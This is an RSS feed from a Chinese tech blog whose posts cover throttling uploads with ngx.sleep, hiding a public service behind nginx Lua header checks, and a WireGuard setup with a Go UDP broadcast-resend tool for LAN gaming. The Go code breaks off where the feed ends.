<?xml version="1.0" encoding="utf-8"?>
<rss version="2.0"
  xmlns:atom="http://www.w3.org/2005/Atom"
  xmlns:content="http://purl.org/rss/1.0/modules/content/">
  <channel>
    <title>xchens</title>
    <link>https://xchens.cn/</link>
    
    <atom:link href="https://xchens.cn/rss.xml" rel="self" type="application/rss+xml"/>
    
    <description>share tech</description>
    <pubDate>Sat, 02 Dec 2023 13:04:48 GMT</pubDate>
    <generator>http://hexo.io/</generator>
    
    <item>
      <title>疑难杂症 之 服务端上传限速</title>
      <link>https://xchens.cn/posts/aa0a08fc/</link>
      <guid>https://xchens.cn/posts/aa0a08fc/</guid>
      <pubDate>Sat, 04 Mar 2023 13:30:00 GMT</pubDate>
      
      <description>如何通过服务端配置反作用到客户端网络</description>
      
      
      
      <content:encoded><![CDATA[<p>一个平凡的下午，突然被拉去 oncall</p><p>服务端带宽打满了！兜不住了！业务马上要挂了！</p><p>于是紧急开始排查，从 nginx 日志里很快定位到是我们的文件上传接口在刷流量</p><p>具体原因这里不展开，现象是合法客户端会不断调用接口上传大文件</p><p>这里也不讨论客户端解决方案，因为客户端就算修了也要打包发版推送</p><p>当然也不可能像对抗 DDOS 那样用防火墙封 ip，因为服务端只看到了公网 ip，而这很可能是整个工区的出口 ip</p><p>而且目前只是流量很费钱，要说把核心业务停下来降温是想都不敢想的 ～</p><p>作为服务端，需要的是一个能立即 <strong>解决故障</strong> 或 <strong>缩小影响面</strong> 的方案</p><p>首先第一反应是阻止重试，尝试构造一些响应来让客户端认为请求成功，别再发包了</p><p>可惜不行，客户端 bug 成因比较复杂，尝试半天的结论就是这样做不了</p><p>然后就努力尝试中断请求，在客户端发完包之前就阻断，减少上行流量</p><p>可惜找了半天也没发现 nginx 有什么好用的配置</p><p>而我们短期也不可能给 nginx 写出来一个网络扩展去影响 4 层协议</p><hr><p>然后作为一个无法解决的问题开始拉更多人讨论 ～</p><p>经过彻夜奋战，得到一个优雅丝滑的方案</p><blockquote><p>TCP 拥塞控制：只要「发送方」没有在规定时间内接收到 ACK 应答报文，也就是发生了超时重传，就会认为网络出现了拥塞</p></blockquote><p>因此降低 server 端的处理速度自然可以反作用到网络链路上</p><p>当 server 端包处理足够慢，自然就实现了由服务端控制的流量限速</p><p>最终的解决方案是 access_by_lua 里注入 <code>ngx.sleep(10)</code></p>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/%E7%BD%91%E7%BB%9C/">网络</category>
      
      <category domain="https://xchens.cn/tags/network/">network</category>
      
      <category domain="https://xchens.cn/tags/server/">server</category>
      
      
      <comments>https://xchens.cn/posts/aa0a08fc/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>浅谈公网服务隐身设计</title>
      <link>https://xchens.cn/posts/65da21a9/</link>
      <guid>https://xchens.cn/posts/65da21a9/</guid>
      <pubDate>Fri, 31 Dec 2021 16:30:00 GMT</pubDate>
      
      <description>分析下如何在复杂的公网环境下隐匿自身，通过网络包过滤来定制化个性隐身方案，又或者基于 nginx lua 扩展提供的强大能力，自定义一个简单的服务隐身实现</description>
      
      
      
      <content:encoded><![CDATA[<h2 id="为什么需要业务隐身"><a href="#为什么需要业务隐身" class="headerlink" title="为什么需要业务隐身"></a>为什么需要业务隐身</h2><p>部署完本文所述的业务隐身方案后，在腾讯云一台普通服务器半个月收到了来自 224 个不同 ip 的访问请求</p><p>在网络世界中，各种匿名爬虫的数量之大超乎想象，它们不知疲倦的搜集着每一台主机的信息</p><p>一旦被它们发现漏洞或后门，被用来当肉鸡挖矿事小，数据泄漏也不是不能忍，</p><p>可万一它们搞什么违法活动是真的会殃及自身的。</p><p>对于业务方来说，我们很难做到时刻保持警惕，也难以时刻跟进最新安全资讯</p><p>一个简单而直接的需求就出现了：不让陌生人发现我们的系统</p><h2 id="如何设计业务隐身"><a href="#如何设计业务隐身" class="headerlink" title="如何设计业务隐身"></a>如何设计业务隐身</h2><p>我们期望的业务隐身模块最好能满足以下特点</p><ul><li>非侵入式<ul><li>不需要对原业务系统做太大改造</li><li>不影响正常业务逻辑</li></ul></li><li>成本可控<ul><li>研发改造成本</li><li>运维成本</li><li>额外性能消耗</li></ul></li><li>通用透明<ul><li>不需要对每个业务系统做针对式改造</li><li>改造后逻辑对具体业务透明</li></ul></li></ul><h2 id="设计方案"><a href="#设计方案" class="headerlink" title="设计方案"></a>设计方案</h2><p>首先考虑通用性，如果需要方案对任意后端服务生效，就必须作用在通信链路上</p><p>通过中间件去验证请求方身份，然后再允许此次通信，否则需要具备阻断能力</p><h3 id="高配方案"><a href="#高配方案" class="headerlink" title="高配方案"></a>高配方案</h3><p>linux 内核提供了一个通用的包过滤框架 netfilter。</p><p>在流量包经过内核协议栈的时候会触发预先注册在 netfilter 的 <a href="https://arthurchiao.art/blog/deep-dive-into-iptables-and-netfilter-arch-zh/">hook</a> 点。</p><ul><li>NF_IP_PRE_ROUTING</li><li>NF_IP_LOCAL_IN</li><li>NF_IP_FORWARD</li><li>NF_IP_LOCAL_OUT</li><li>NF_IP_POST_ROUTING</li></ul><p>这里不多赘述细节了，因为一篇文章根本讲不完。</p><p>总之通过 netfilter 我们可以实现很多非常灵活的包校验逻辑，比如</p><ol><li>区分通信端口和认证端口</li></ol><p>认证端口负责完成一系列用户登录逻辑</p><p>通信端口则是正常的业务处理逻辑，如果用户 ip 没有认证过则拦截流量</p><ol start="2"><li>tcp&#x2F;udp 内容校验</li></ol><p>若客户端发过来的包里不符合特定格式，或不带特定 key 则自动丢包</p><h3 id="经济方案"><a href="#经济方案" class="headerlink" title="经济方案"></a>经济方案</h3><p>在绝大多数的服务器上都会部署一个 nginx 作为反向代理，因此本方案的通用性是足够好的</p><p>在 nginx 中，我们可以通过接入 lua 扩展来定制化请求校验逻辑（参见 <a href="https://github.com/openresty/openresty">openresty</a>）</p><p>而且相比上述高配方案，这里校验 https 请求也变得更为简单</p><ol><li><p>首先需要配置禁止 ip 直接访问，目的是屏蔽那些简单粗暴遍历 ip 的爬虫</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 default_server;</span><br><span class="line">    server_name _;</span><br><span class="line">    return 444;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>然后配置定制化校验逻辑，比如这里校验请求头部必须带上时间戳</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">location / &#123;</span><br><span class="line">    # deny anonymous request</span><br><span class="line">    access_by_lua_block &#123;</span><br><span class="line">        local xtoken = ngx.req.get_headers()[&quot;Token&quot;]</span><br><span class="line">        if not xtoken then</span><br><span class="line">            ngx.exit(ngx.HTTP_CLOSE)</span><br><span class="line">        end</span><br><span class="line">        local token = &quot;&quot;</span><br><span class="line">        if type(xtoken) == &quot;string&quot; then </span><br><span class="line">            token = xtoken</span><br><span class="line">        else</span><br><span class="line">            token = xtoken[1] </span><br><span class="line">        end</span><br><span class="line">        if not token then</span><br><span class="line">            ngx.exit(ngx.HTTP_CLOSE)</span><br><span class="line">        end</span><br><span class="line">        local t = tonumber(token)</span><br><span class="line">        if not t or math.abs(ngx.now()-t) &gt; 600 then</span><br><span class="line">            ngx.exit(ngx.HTTP_CLOSE)</span><br><span class="line">        end</span><br><span class="line">        return</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    root   html;</span><br><span class="line">    index  index.html index.htm;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><p>第二步的校验逻辑也可以改成其他自定义的 token，配合一些加密算法效果更好</p><p>完成以上两步后，除非其他人专门渗透你的服务器，否则完全不用担心被爬虫扫到</p><p>即使日后你使用的依赖库爆出惊天大漏洞，也可以放心不会被脚本小子乱打</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p><strong>从没有绝对的安全</strong></p><p>每种安全方案都只能解决一些特定场景的问题，业务隐身能非常好的避免供应链漏洞被暴露在公共网络下</p><p>对于防止漏洞被滥用，防止无意义流量嗅探有着较好的效果，但绝不意味着可以放松警惕</p><p>它非常适合那些「希望自己的服务只被正确的人用来做合适的事」的场景</p><h2 id="附录"><a href="#附录" class="headerlink" title="附录"></a>附录</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">worker_processes  2;</span><br><span class="line">pid logs/nginx.pid;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">    worker_connections  1024;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line">    include       mime.types;</span><br><span class="line">    default_type  application/octet-stream;</span><br><span class="line"></span><br><span class="line">    log_format  main  &#x27;$remote_addr - $remote_user [$time_local] &quot;$request&quot; &#x27;</span><br><span class="line">                     &#x27;$status $body_bytes_sent &quot;$http_referer&quot; &#x27;</span><br><span class="line">                     &#x27;&quot;$http_user_agent&quot; &quot;$http_x_forwarded_for&quot;&#x27;;</span><br><span class="line"></span><br><span class="line">    access_log /opt/nginx/log/access.log main;</span><br><span class="line">    error_log /opt/nginx/log/error.log;</span><br><span class="line">    sendfile        on;</span><br><span class="line">    #tcp_nopush     on;</span><br><span class="line"></span><br><span class="line">    keepalive_timeout  65;</span><br><span class="line"></span><br><span class="line">    # disable ip request</span><br><span class="line">    server &#123;</span><br><span class="line">        listen 443 default_server;</span><br><span class="line">        server_name _;</span><br><span class="line">        ssl_certificate      cert/example.org_bundle.pem;</span><br><span class="line">        ssl_certificate_key  cert/example.org.key;</span><br><span class="line"></span><br><span class="line">        ssl_session_cache    shared:SSL:1m;</span><br><span class="line">        ssl_session_timeout  5m;</span><br><span class="line">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; </span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">        return 444;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    # HTTPS server</span><br><span class="line">    #</span><br><span class="line">    server &#123;</span><br><span class="line">        listen       443 ssl;</span><br><span class="line">        server_name  example.org;</span><br><span class="line"></span><br><span class="line">        ssl_certificate      cert/example.org_bundle.pem;</span><br><span class="line">        ssl_certificate_key  cert/example.org.key;</span><br><span class="line"></span><br><span class="line">        ssl_session_cache    shared:SSL:1m;</span><br><span class="line">        ssl_session_timeout  5m;</span><br><span class="line">        ssl_ciphers ECDHE-RSA-AES128-GCM-SHA256:HIGH:!aNULL:!MD5:!RC4:!DHE; </span><br><span class="line">        ssl_prefer_server_ciphers  on;</span><br><span class="line"></span><br><span class="line">        location / &#123;</span><br><span class="line">            # deny anonymous request</span><br><span class="line">            access_by_lua_block &#123;</span><br><span class="line">                local xtoken = ngx.req.get_headers()[&quot;Token&quot;]</span><br><span class="line">                if not xtoken then</span><br><span class="line">                    ngx.exit(ngx.HTTP_CLOSE)</span><br><span class="line">                end</span><br><span class="line">                local token = &quot;&quot;</span><br><span class="line">                if type(xtoken) == &quot;string&quot; then </span><br><span class="line">                    token = xtoken</span><br><span class="line">                else</span><br><span class="line">                    token = xtoken[1] </span><br><span class="line">                end</span><br><span class="line">                if not token then</span><br><span class="line">                    ngx.exit(ngx.HTTP_CLOSE)</span><br><span class="line">                end</span><br><span class="line">                local t = tonumber(token)</span><br><span class="line">                if not t or math.abs(ngx.now()-t) &gt; 600 then</span><br><span class="line">                    ngx.exit(ngx.HTTP_CLOSE)</span><br><span class="line">                end</span><br><span class="line">                return</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            root   html;</span><br><span class="line">            index  index.html index.htm;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content:encoded>
      
      
      
      <category domain="https://xchens.cn/tags/nginx/">nginx</category>
      
      <category domain="https://xchens.cn/tags/lua/">lua</category>
      
      <category domain="https://xchens.cn/tags/service/">service</category>
      
      
      <comments>https://xchens.cn/posts/65da21a9/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>如何异地组网来玩局域网游戏 - 文明6</title>
      <link>https://xchens.cn/posts/1d434264/</link>
      <guid>https://xchens.cn/posts/1d434264/</guid>
      <pubDate>Sun, 24 Oct 2021 09:00:00 GMT</pubDate>
      
      <description>以「文明6」为例，手把手尝试和朋友搭建一个异地局域网，感受超低延迟联机体验</description>
      
      
      
      <content:encoded><![CDATA[<p>周末一起联机玩一把文明6是多么快乐的事呀，但是坑爹的网络无情地摧毁了一切 </p><p>同步回合慢就算了，时不时掉线真的是完全不能忍了</p><p>想来想去，咱这网络条件，肯定问题不在这里呀</p><p>花钱买了加速器还这么卡，问题八成也不在网络链路上呀</p><p>破案了，问题就是官方服务器垃圾垃圾垃圾～～</p><p>我们，必须要抗争，同这不合理的网络斗争</p><hr><p>首先，咱肯定是要想办法摆脱官方服务器，因为只要网络要走官服，就肯定要卡</p><p>搜来搜去，只找到了国内某游戏平台，可惜的是，下载的时候浏览器报毒了</p><p>没办法，强烈洁癖忍不了，方案作废</p><p><strong>没有路，那就开一条路出来</strong></p><p>我们得先想想，我们联机时为什么要走官方服务器</p><p>显然是因为需要一个媒介来帮助两个异地小伙伴进行愉快的网络通信</p><p>因为 NAT 的流行，导致两个不同局域网的用户很难进行 p2p 通信</p><p>即使有着花样繁多的 p2p 方案，也没谁能保证稳定高可用</p><p>所以官方选择搭建一个服务器来帮助联机也是可以理解的</p><p>但是 ！！！</p><p>我们还可以选择局域网联机，流量直达，稳定可靠</p><p>那么有什么能让异地小伙伴快乐的异地组网呢？</p><p>当然是 V ～ P ～ N ～</p><p>这里感谢 jintao 在使用 wireguard 搭 vpn 时的巨大贡献 :D</p><p>如果问题到此迎刃而解，那本文也未免太水了</p><p>接着我们就会遇到游戏联机史上最常见的问题：搜不到房间</p><p>其实这个问题以前上学时玩饥荒联机就遇到过，只要关掉多余的网卡就行</p><p>但是 wireguard，或者说几乎所有 vpn 软件组网时，都是使用了虚拟网卡</p><p>而这个虚拟网卡又干扰了游戏间正常的互相寻找流程</p><p>「关掉网卡，我连不上你；开启网卡，我找不到你」</p><p>当然我第一反应是把 wireguard 整到路由器上，这样就避免了本地网卡干扰了</p><p>但可惜的是，这个方案过于麻烦，并不是特别满意</p><p>所以我们就思考呀，为啥找不到房间呢？</p><p>找不到房间其实就是两端的进程无法发现对方，也就是「服务发现」失败</p><p>任何局域网联机都依赖于自己的服务发现，而且一般不会是 consul 这样复杂的方案</p><p>一般软件都会通过广播包来实现自己的简化版服务发现</p><p>那么八成就是这个广播包在虚拟网卡的干扰下，没有正确投递到对方机器咯</p><p>就没啥好说的，打开 Wireshark 抓个包，得到文明6发的一系列 udp 服务发现包</p><p>然后看地址是发到 255.255.255.255 的，查看路由表就一目了然了</p><p>默认的 255.255.255.255 地址是路由到了我的物理网卡上</p><p>所以对端的小伙伴时无法收到这个包的</p><p>接下来有两个办法</p><ol><li>「路线纠正」修改路由表，让这个地址的广播包走到 wireguard 虚拟网卡上</li><li>「明确目标」抓包重发，把 udp 包内容修改目的地址后，直接发到小伙伴机器上</li></ol><p>感觉方案1有点不太好，因为改路由表还是不靠谱，容易触发未知 bug </p><p>这里选择了方案2，简单写了个抓包重发工具</p><p>果然成功了～～～</p><p>知识改变游戏 ^-^</p><hr><h4 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h4><p>其实感觉是可以把两地的网络配成真正互通的，这样才是最完美的方案</p><p>但是一直没想到比较好的办法，要是有网络大佬指教一下就好了 QAQ</p><p>为啥抓包重发后就能成功呢，因为最开始的服务发现包是 udp，是无连接的</p><p>也就是说我们可以手动构造发包来源和目的地址</p><p>那么，我们把来源端口设置为文明6进程使用的端口，目的地址修改为小伙伴机器的 ip</p><p>这个 udp 包自然能被顺利投递过去</p><p>而服务发现最重要的就是互相发现，当我们架上了这样一座桥后</p><p>对端就知道了这里有个进程在寻找房间，对面就会主动发房间信息过来</p><p>然后的然后，一切都刚刚好</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"># Wirgurad Server Config</span><br><span class="line">[Interface]</span><br><span class="line">Address = 10.100.0.1/16</span><br><span class="line">SaveConfig = false</span><br><span class="line">PostUp = iptables -A FORWARD -i %i -j ACCEPT; iptables -A FORWARD -o %i -j ACCEPT; iptables -t nat -A POSTROUTING -o wg0 -j MASQUERADE</span><br><span class="line">PostDown = iptables -D FORWARD -i %i -j ACCEPT; iptables -D FORWARD -o %i -j ACCEPT; iptables -t nat -D POSTROUTING -o wg0 -j MASQUERADE</span><br><span class="line">ListenPort = 10000</span><br><span class="line">PrivateKey = Axxxxxxxxxxxxxxxxx</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = Bxxxxxxxxxxxxxxxx</span><br><span class="line">AllowedIPs = 10.100.0.1/24</span><br><span class="line"></span><br><span class="line">[Peer]</span><br><span class="line">PublicKey = Cxxxxxxxxxxxxxxxx</span><br><span class="line">AllowedIPs = 10.100.1.1/24</span><br></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 抓包重发小工具</span></span><br><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;context&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;log&quot;</span></span><br><span class="line"><span class="string">&quot;net&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;os/signal&quot;</span></span><br><span class="line"><span class="string">&quot;strings&quot;</span></span><br><span class="line"><span class="string">&quot;syscall&quot;</span></span><br><span class="line"><span class="string">&quot;time&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/google/gopacket&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/gopacket/layers&quot;</span></span><br><span class="line"><span class="string">&quot;github.com/google/gopacket/pcap&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">iface     = flag.String(<span class="string">&quot;iface&quot;</span>, <span class="string">&quot;en0&quot;</span>, <span class="string">&quot;interface of network&quot;</span>)</span><br><span class="line">from      = flag.String(<span class="string">&quot;from&quot;</span>, <span class="string">&quot;10.100.0.6&quot;</span>, <span class="string">&quot;copy udp packet from&quot;</span>)</span><br><span class="line">to        = flag.String(<span class="string">&quot;to&quot;</span>, <span class="string">&quot;10.100.255.255&quot;</span>, <span class="string">&quot;copy udp packet to&quot;</span>)</span><br><span class="line">showIface = flag.Bool(<span class="string">&quot;show-iface&quot;</span>, <span class="literal">false</span>, <span class="string">&quot;show interface of network&quot;</span>)</span><br><span class="line"></span><br><span class="line">packets = <span class="built_in">make</span>(<span class="keyword">chan</span> *pkt, <span class="number">100</span>)</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> pkt <span class="keyword">struct</span> &#123;</span><br><span class="line">SrcPort <span class="type">int</span></span><br><span class="line">DstPort <span class="type">int</span></span><br><span class="line">Payload []<span class="type">byte</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">capture</span><span class="params">(ctx context.Context, device <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">ethLyr  layers.Ethernet</span><br><span class="line">ip4Lyr  layers.IPv4</span><br><span class="line">ip6Lyr  layers.IPv6</span><br><span class="line">udpLyr  layers.UDP</span><br><span class="line">dnsLyr  layers.DNS</span><br><span class="line">ntpLyr  layers.NTP</span><br><span class="line">payload gopacket.Payload</span><br><span class="line">)</span><br><span class="line">parser := gopacket.NewDecodingLayerParser(layers.LayerTypeEthernet, &amp;ethLyr, &amp;ip4Lyr, &amp;ip6Lyr, &amp;udpLyr, &amp;payload, &amp;dnsLyr, &amp;ntpLyr)</span><br><span class="line">decoded := <span class="built_in">make</span>([]gopacket.LayerType, <span class="number">0</span>)</span><br><span class="line">newHandler := <span class="function"><span class="keyword">func</span><span class="params">()</span></span> *pcap.Handle &#123;</span><br><span class="line">inactive, err := pcap.NewInactiveHandle(device)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> inactive.CleanUp()</span><br><span class="line"><span class="keyword">if</span> err = inactive.SetPromisc(<span class="literal">true</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = inactive.SetSnapLen(<span class="number">4096</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err = inactive.SetTimeout(time.Minute); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line">handler, err := inactive.Activate()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> handler</span><br><span class="line">&#125;</span><br><span class="line">handler := newHandler()</span><br><span class="line"><span class="keyword">if</span> err := handler.SetBPFFilter(<span class="string">&quot;udp&quot;</span>); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(<span class="string">&quot;set bpf failed, &quot;</span>, err.Error())</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">log.Println(<span class="string">&quot;capture start&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line"><span class="keyword">select</span> &#123;</span><br><span class="line"><span class="keyword">case</span> &lt;-ctx.Done():</span><br><span class="line">log.Println(<span class="string">&quot;capture stop&quot;</span>)</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line"><span class="keyword">default</span>:</span><br><span class="line">data, _, err := handler.ReadPacketData()</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Fatal(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> err := parser.DecodeLayers(data, &amp;decoded); err != <span class="literal">nil</span> &#123;</span><br><span class="line">log.Println(<span class="string">&quot;decode error: &quot;</span>, err.Error())</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> packet pkt</span><br><span class="line"><span class="keyword">for</span> _, layer := <span class="keyword">range</span> decoded &#123;</span><br><span class="line"><span class="keyword">switch</span> layer &#123;</span><br><span class="line"><span class="keyword">case</span> layers.LayerTypeIPv4:</span><br><span class="line"><span class="keyword">if</span> ip4Lyr.DstIP[<span class="number">3</span>] != <span class="number">0xff</span> &amp;&amp; !ip4Lyr.DstIP.IsMulticast() &#123;</span><br><span class="line"><span class="keyword">goto</span> endPacket</span><br><span class="line">&#125;</span><br><span class="line"><span 